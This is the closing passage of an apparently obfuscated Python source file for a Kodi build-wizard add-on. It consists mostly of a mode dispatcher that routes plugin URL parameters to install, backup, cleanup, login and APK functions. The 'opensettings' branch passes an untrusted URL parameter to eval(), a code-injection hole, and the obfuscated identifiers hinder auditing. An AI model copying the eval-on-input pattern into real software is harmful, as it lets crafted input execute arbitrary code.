				O0OO0O0OOO000O000 =os .path .join (user_folder ,OOO00OO000O0OO00O )#line:5054
				if os .path .exists (O0OO0O0OOO000O000 ):#line:5056
					for O0000O0O0O0O0OOOO ,OO00000OO0O00O0OO ,OOO0000OO0O0OO00O in os .walk (O0OO0O0OOO000O000 ):#line:5057
						for OO00O00O0000OOOOO in OOO0000OO0O0OO00O :#line:5058
							os .unlink (os .path .join (O0000O0O0O0O0OOOO ,OO00O00O0000OOOOO ))#line:5059
						for O00OOOO0OOO0O00O0 in OO00000OO0O00O0OO :#line:5060
							shutil .rmtree (os .path .join (O0000O0O0O0O0OOOO ,O00OOOO0OOO0O00O0 ))#line:5061
					os .rmdir (O0OO0O0OOO000O000 )#line:5062
	except :pass #line:5064
params =get_params ()#line:5065
url =None #line:5066
name =None #line:5067
mode =None #line:5068
try :mode =urllib .unquote_plus (params ["mode"])#line:5070
except :pass #line:5071
try :name =urllib .unquote_plus (params ["name"])#line:5072
except :pass #line:5073
try :url =urllib .unquote_plus (params ["url"])#line:5074
except :pass #line:5075
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5077
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5078
def setView (O000OO000OOOOOO00 ,OOO0OOO00O0OOOOOO ):#line:5079
	if wiz .getS ('auto-view')=='true':#line:5080
		O000O0O0OO0O0O0O0 =wiz .getS (OOO0OOO00O0OOOOOO )#line:5081
		if O000O0O0OO0O0O0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O000O0O0OO0O0O0O0 ='55'#line:5082
		if O000O0O0OO0O0O0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O000O0O0OO0O0O0O0 ='50'#line:5083
		wiz .ebi ("Container.SetViewMode(%s)"%O000O0O0OO0O0O0O0 )#line:5084
if mode ==None :index ()#line:5086
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5088
elif mode =='builds':buildMenu ()#line:5089
elif mode =='viewbuild':viewBuild (name )#line:5090
elif mode =='buildinfo':buildInfo (name )#line:5091
elif mode =='buildpreview':buildVideo (name )#line:5092
elif mode =='install':buildWizard (name ,url )#line:5093
elif mode =='theme':buildWizard (name ,mode ,url )#line:5094
elif mode =='viewthirdparty':viewThirdList (name )#line:5095
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5096
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5097
elif mode =='maint':maintMenu (name )#line:5099
elif mode =='passpin':passandpin ()#line:5100
elif mode =='backmyupbuild':backmyupbuild ()#line:5101
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5102
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5103
elif mode =='advancedsetting':advancedWindow (name )#line:5104
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5105
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5106
elif mode =='asciicheck':wiz .asciiCheck ()#line:5107
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5108
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5109
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5110
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5111
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5112
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5113
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5114
elif mode =='currentsettings':viewAdvanced ()#line:5115
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5116
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5117
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5118
elif mode =='fixskin':backtokodi ()#line:5119
elif mode =='testcommand':testcommand ()#line:5120
elif mode =='rdon':rdon ()#line:5121
elif mode =='rdoff':rdoff ()#line:5122
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5123
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5124
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5125
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5126
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5127
elif mode =='freshstart':freshStart ()#line:5128
elif mode =='forceupdate':wiz .forceUpdate ()#line:5129
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5130
elif mode =='forceclose':wiz .killxbmc ()#line:5131
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5132
elif mode =='hidepassword':wiz .hidePassword ()#line:5133
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5134
elif mode =='enableaddons':enableAddons ()#line:5135
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5136
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5137
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5138
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5139
elif mode =='uploadlog':uploadLog .Main ()#line:5140
elif mode =='viewlog':LogViewer ()#line:5141
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5142
elif mode =='viewerrorlog':errorChecking (all =True )#line:5143
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5144
elif mode =='purgedb':purgeDb ()#line:5145
elif mode =='fixaddonupdate':fixUpdate ()#line:5146
elif mode =='removeaddons':removeAddonMenu ()#line:5147
elif mode =='removeaddon':removeAddon (name )#line:5148
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5149
elif mode =='removedata':removeAddonData (name )#line:5150
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5151
elif mode =='systeminfo':systemInfo ()#line:5152
elif mode =='restorezip':restoreit ('build')#line:5153
elif mode =='restoregui':restoreit ('gui')#line:5154
elif mode =='restoreaddon':restoreit ('addondata')#line:5155
elif mode =='restoreextzip':restoreextit ('build')#line:5156
elif mode =='restoreextgui':restoreextit ('gui')#line:5157
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5158
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5159
elif mode =='apk':apkMenu (name )#line:5161
elif mode =='apkscrape':apkScraper (name )#line:5162
elif mode =='apkinstall':apkInstaller (name ,url )#line:5163
elif mode =='speed':speedMenu ()#line:5164
elif mode =='net':net_tools ()#line:5165
elif mode =='GetList':GetList (url )#line:5166
elif mode =='youtube':youtubeMenu (name )#line:5167
elif mode =='viewVideo':playVideo (url )#line:5168
elif mode =='addons':addonMenu (name )#line:5170
elif mode =='addoninstall':addonInstaller (name ,url )#line:5171
elif mode =='savedata':saveMenu ()#line:5173
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5174
elif mode =='managedata':manageSaveData (name )#line:5175
elif mode =='whitelist':wiz .whiteList (name )#line:5176
elif mode =='trakt':traktMenu ()#line:5178
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5179
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5180
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5181
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5182
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5183
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5184
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5185
elif mode =='realdebrid':realMenu ()#line:5187
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5188
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5189
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5190
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5191
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5192
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5193
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5194
elif mode =='login':loginMenu ()#line:5196
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5197
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5198
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5199
elif mode =='clearlogin':loginit .clearSaved (name )#line:5200
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5201
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5202
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5203
elif mode =='contact':notify .contact (CONTACT )#line:5205
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5206
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5207
elif mode =='developer':developer ()#line:5209
elif mode =='converttext':wiz .convertText ()#line:5210
elif mode =='createqr':wiz .createQR ()#line:5211
elif mode =='testnotify':testnotify ()#line:5212
elif mode =='testnotify2':testnotify2 ()#line:5213
elif mode =='servicemanual':servicemanual ()#line:5214
elif mode =='fastinstall':fastinstall ()#line:5215
elif mode =='testupdate':testupdate ()#line:5216
elif mode =='testfirst':testfirst ()#line:5217
elif mode =='testfirstrun':testfirstRun ()#line:5218
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5219
elif mode =='bg':wiz .bg_install (name ,url )#line:5221
elif mode =='bgcustom':wiz .bg_custom ()#line:5222
elif mode =='bgremove':wiz .bg_remove ()#line:5223
elif mode =='bgdefault':wiz .bg_default ()#line:5224
elif mode =='rdset':rdsetup ()#line:5225
elif mode =='mor':morsetup ()#line:5226
elif mode =='mor2':morsetup2 ()#line:5227
elif mode =='resolveurl':resolveurlsetup ()#line:5228
elif mode =='urlresolver':urlresolversetup ()#line:5229
elif mode =='forcefastupdate':forcefastupdate ()#line:5230
elif mode =='traktset':traktsetup ()#line:5231
elif mode =='placentaset':placentasetup ()#line:5232
elif mode =='flixnetset':flixnetsetup ()#line:5233
elif mode =='reptiliaset':reptiliasetup ()#line:5234
elif mode =='yodasset':yodasetup ()#line:5235
elif mode =='numbersset':numberssetup ()#line:5236
elif mode =='uranusset':uranussetup ()#line:5237
elif mode =='genesisset':genesissetup ()#line:5238
elif mode =='fastupdate':fastupdate ()#line:5239
elif mode =='folderback':folderback ()#line:5240
elif mode =='menudata':Menu ()#line:5241
elif mode ==2 :#line:5243
        wiz .torent_menu ()#line:5244
elif mode ==3 :#line:5245
        wiz .popcorn_menu ()#line:5246
elif mode ==8 :#line:5247
        wiz .metaliq_fix ()#line:5248
elif mode ==9 :#line:5249
        wiz .quasar_menu ()#line:5250
elif mode ==5 :#line:5251
        swapSkins ('skin.Premium.mod')#line:5252
elif mode ==13 :#line:5253
        wiz .elementum_menu ()#line:5254
elif mode ==16 :#line:5255
        wiz .fix_wizard ()#line:5256
elif mode ==17 :#line:5257
        wiz .last_play ()#line:5258
elif mode ==18 :#line:5259
        wiz .normal_metalliq ()#line:5260
elif mode ==19 :#line:5261
        wiz .fast_metalliq ()#line:5262
elif mode ==20 :#line:5263
        wiz .fix_buffer2 ()#line:5264
elif mode ==21 :#line:5265
        wiz .fix_buffer3 ()#line:5266
elif mode ==11 :#line:5267
        wiz .fix_buffer ()#line:5268
elif mode ==15 :#line:5269
        wiz .fix_font ()#line:5270
elif mode ==14 :#line:5271
        wiz .clean_pass ()#line:5272
elif mode ==22 :#line:5273
        wiz .movie_update ()#line:5274
elif mode =='adv_settings':buffer1 ()#line:5275
elif mode =='getpass':getpass ()#line:5276
elif mode =='setpass':setpass ()#line:5277
elif mode =='setuname':setuname ()#line:5278
elif mode =='passandUsername':passandUsername ()#line:5279
elif mode =='9':disply_hwr ()#line:5280
elif mode =='99':disply_hwr2 ()#line:5281
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))